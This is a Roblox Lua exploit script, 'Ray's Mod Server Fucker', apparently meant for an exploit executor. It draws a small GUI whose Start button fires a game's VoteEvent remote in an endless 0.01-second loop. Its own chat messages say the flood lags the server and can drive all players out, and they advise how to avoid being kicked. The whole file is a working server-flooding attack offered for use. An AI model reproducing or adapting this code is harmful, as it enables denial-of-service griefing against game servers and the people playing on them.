local ScreenGui = Instance.new("ScreenGui")
local frame1 = Instance.new("Frame")
local frame2 = Instance.new("Frame")
local funnetitle = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local StartButton = Instance.new("TextButton")
local StartButtonUiCorner = Instance.new("UICorner")
local right = Instance.new("ImageButton")

ScreenGui.Parent = game.CoreGui

frame1.Name = "frame1"
frame1.Parent = ScreenGui
frame1.AnchorPoint = Vector2.new(0.5, 0.5)
frame1.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
frame1.BorderColor3 = Color3.fromRGB(95, 0, 235)
frame1.Position = UDim2.new(0.5, 0, 0.5, 0)
frame1.Size = UDim2.new(0, 296, 0, 139)
frame1.Active = true
frame1.Draggable = true

frame2.Name = "frame2"
frame2.Parent = frame1
frame2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
frame2.BorderColor3 = Color3.fromRGB(95, 0, 235)
frame2.Size = UDim2.new(0, 296, 0, 35)

funnetitle.Name = "funnetitle"
funnetitle.Parent = frame1
funnetitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
funnetitle.BackgroundTransparency = 1.000
funnetitle.Position = UDim2.new(0.141150385, 0, 0, 0)
funnetitle.Size = UDim2.new(0, 213, 0, 35)
funnetitle.Font = Enum.Font.GothamSemibold
funnetitle.Text = "Ray's Mod Server Fucker"
funnetitle.TextColor3 = Color3.fromRGB(255, 255, 255)
funnetitle.TextSize = 18.000

CloseButton.Name = "CloseButton"
CloseButton.Parent = frame1
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.BackgroundTransparency = 1.000
CloseButton.Position = UDim2.new(0.945551336, 0, 0, 0)
CloseButton.Size = UDim2.new(0, 19, 0, 19)
CloseButton.Font = Enum.Font.GothamSemibold
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 0, 4)
CloseButton.TextSize = 18.000
CloseButton.TextWrapped = true
CloseButton.MouseButton1Down:Connect(function()
	frame1.Visible = false
end)

StartButton.Name = "StartButton"
StartButton.Parent = frame1
StartButton.BackgroundColor3 = Color3.fromRGB(0, 255, 106)
StartButton.Position = UDim2.new(0.161395431, 0, 0.387890816, 0)
StartButton.Size = UDim2.new(0, 200, 0, 55)
StartButton.Font = Enum.Font.GothamSemibold
StartButton.Text = "Start"
StartButton.TextColor3 = Color3.fromRGB(0, 0, 0)
StartButton.TextSize = 23.000
StartButton.MouseButton1Down:Connect(function()
	local sound = Instance.new("Sound", game.Workspace)
	sound.SoundId = "rbxassetid://1238528678"
	sound.Playing = true
	do
		while true do
			wait(0.01)
			game:GetService("ReplicatedStorage").VotingInProgress.VoteEvent:FireServer()
		end
	end
end)

StartButtonUiCorner.CornerRadius = UDim.new(0, 5)
StartButtonUiCorner.Name = "StartButtonUiCorner"
StartButtonUiCorner.Parent = StartButton

right.Name = "right"
right.Parent = StartButton
right.BackgroundTransparency = 1.000
right.Position = UDim2.new(0.795000017, 0, 0.209090948, 0)
right.Size = UDim2.new(0, 31, 0, 31)
right.ZIndex = 2
right.Image = "rbxassetid://6764432408"
right.ImageRectOffset = Vector2.new(100, 150)
right.ImageRectSize = Vector2.new(50, 50)

local function Message()
	print("Ray's Mod SERVER FUCKER, Made by Yordi10#2082")
	print("Have fun using this script :)")
end
Message()

wait(0.01)
bc = BrickColor.new("White")
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "Ray's Mod Server Fucker has loaded! Enjoy";
	Font = Enum.Font.Arial;
	Color = bc.Color;
	FontSize = Enum.FontSize.Size96;
})

wait(0.01)
bc = BrickColor.new("White")
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "This will lag the server by spamming the voteevent remote, it can SOMETIMES make all the players leave in the server";
	Font = Enum.Font.Arial;
	Color = bc.Color;
	FontSize = Enum.FontSize.Size96;
})

wait(0.01)
bc = BrickColor.new("White")
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "You can press the start button more than once, just dont spam click the button or you will get kicked";
	Font = Enum.Font.Arial;
	Color = bc.Color;
	FontSize = Enum.FontSize.Size96;
})

--Created by Yordi10#2082
